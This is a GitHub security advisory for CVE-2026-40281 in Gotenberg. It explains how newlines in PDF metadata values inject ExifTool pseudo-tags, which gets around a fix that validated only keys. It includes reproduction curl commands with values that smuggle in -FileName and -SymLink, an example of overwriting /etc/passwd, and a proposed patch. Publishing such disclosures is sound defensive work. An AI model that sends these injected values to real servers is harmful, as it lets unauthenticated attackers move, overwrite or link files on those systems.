# [C] Gotenberg has ExifTool stdin argument injection via metadata value newlines (bypass of key sanitization fix)

## Summary
Severity: Critical
Advisory: GHSA-q7r4-hc83-hf2q
CVE: CVE-2026-40281
CWE: CWE-88
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H (CVSS_V3)
Published: 2026-04-30
Source: https://github.com/advisories/GHSA-q7r4-hc83-hf2q
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.31.0

## Details
## Vulnerability Details

**CWE**: CWE-20 - Improper Input Validation

The metadata value sanitization introduced in v8.30.1 (commit 405f106) only validates metadata KEYS via safeKeyPattern regex. Metadata VALUES are passed unsanitized to go-exiftool SetString(), which writes them as fmt.Fprintln(e.stdin, "-"+k+"="+str). A newline (\n) in a value splits the ExifTool stdin line into two separate arguments, allowing injection of arbitrary ExifTool pseudo-tags such as -FileName, -Directory, -SymLink, -HardLink. Docker-verified: HTTP 404 returned (file moved), /tmp/inject_proof created in container. This is a bypass of the incomplete fix in v8.30.1.

## Summary

The metadata write endpoint in v8.30.1 validates metadata **keys** for control characters (commit 405f106) but leaves metadata **values** unsanitized. go-exiftool's `WriteMetadata` sends each key/value pair to ExifTool's stdin as:

```
fmt.Fprintln(e.stdin, "-"+k+"="+str)
```

A `\n` character in `str` splits this into two separate stdin lines, injecting an arbitrary ExifTool pseudo-tag argument. The attacker controls what comes after the newline, enabling injection of `-FileName`, `-Directory`, `-SymLink`, `-HardLink`, and other dangerous pseudo-tags — the exact tags the key blocklist was designed to prevent.

## Root Cause

`pkg/modules/exiftool/exiftool.go` — `WriteMetadata()` function:

```go
// KEY validation added in v8.30.1 (commit 405f106)
for key := range metadata {
    if !safeKeyPattern.MatchString(key) {  // ← only keys checked
        return fmt.Errorf(...)
    }
}

// VALUE passed through unsanitized:
case string:
    fileMetadata[0].SetString(key, val)  // ← val may contain \n
```

go-exiftool (`barasher/go-exiftool`) then writes:

```go
fmt.Fprintln(e.stdin, "-"+k+"="+str)
// If str = "test\n-FileName=/tmp/inject_proof"
// ExifTool receives two lines:
//   -Title=test
//   -FileName=/tmp/inject_proof
```

## Steps to Reproduce

```
1. Start Gotenberg:
   docker run --name gotenberg-test -p 3001:3000 gotenberg/gotenberg:8

2. Create a test PDF:
   curl -s -F 'files=@/dev/stdin;filename=index.html;type=text/html' \
     -o test.pdf http://localhost:3001/forms/chromium/convert/html \
     <<< '<html><body>test</body></html>'

3. Inject -FileName via value newline:
   curl -s -w "\nHTTP %{http_code}" \
     -F 'files=@test.pdf;type=application/pdf' \
     -F 'metadata={"Title":"test\n-FileName=/tmp/inject_proof"}' \
     http://localhost:3001/forms/pdfengines/metadata/write
   # Returns HTTP 404 (file moved away from temp path)

4. Verify injection inside container:
   docker exec gotenberg-test ls -la /tmp/inject_proof
   # -rw-r--r-- 1 root root ... /tmp/inject_proof  (PDF moved here)

5. Symlink injection:
   curl -s -w "\nHTTP %{http_code}" \
     -F 'files=@test.pdf;type=application/pdf' \
     -F 'metadata={"Title":"test\n-SymLink=/tmp/sym_inject"}' \
     http://localhost:3001/forms/pdfengines/metadata/write
   docker exec gotenberg-test ls -la /tmp/sym_inject
   # lrwxrwxrwx ... /tmp/sym_inject -> /tmp/.../source.pdf
```

## Impact

An unauthenticated attacker can:

1. **Rename/move** any PDF being processed to an arbitrary path in the container filesystem (running as root by default)
2. **Overwrite** arbitrary files — e.g., `-Directory=/etc/ -FileName=passwd` injects two lines, moving the PDF to `/etc/passwd`, corrupting the system user database
3. **Create symlinks** at arbitrary paths via `-SymLink=`, enabling subsequent read/write primitives
4. **Create hard links** via `-HardLink=`, persisting data beyond temp directory cleanup

This is a complete bypass of the key-sanitization fix introduced in v8.30.1 (commit 405f106). The fix validated the wrong side of the `=` sign.

## Proposed Fix

Add value sanitization parallel to the existing key check in `WriteMetadata`:

```go
for key, value := range metadata {
    if !safeKeyPattern.MatchString(key) {
        return fmt.Errorf("write PDF metadata with ExifTool: invalid metadata key %q", key)
    }
    if str, ok := value.(string); ok {
        if strings.ContainsAny(str, "\n\r\x00") {
            return fmt.Errorf("write PDF metadata with ExifTool: invalid value for key %q (contains control character)", key)
        }
    }
}
```

Or, apply the same `safeKeyPattern` logic to string values, or percent-encode newlines before passing to go-exiftool.

### Vulnerable Code

```go
// See description for details
```

## Steps to Reproduce

1. Set up the application using the default configuration
2. See the vulnerability details above


## Impact

This vulnerability may allow an attacker to compromise the application.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-q7r4-hc83-hf2q
- https://nvd.nist.gov/vuln/detail/CVE-2026-40281
- https://github.com/gotenberg/gotenberg/commit/405f1069c026bb08f319fb5a44e5c67c33208318
- https://github.com/gotenberg/gotenberg
- https://github.com/gotenberg/gotenberg/releases/tag/v8.31.0
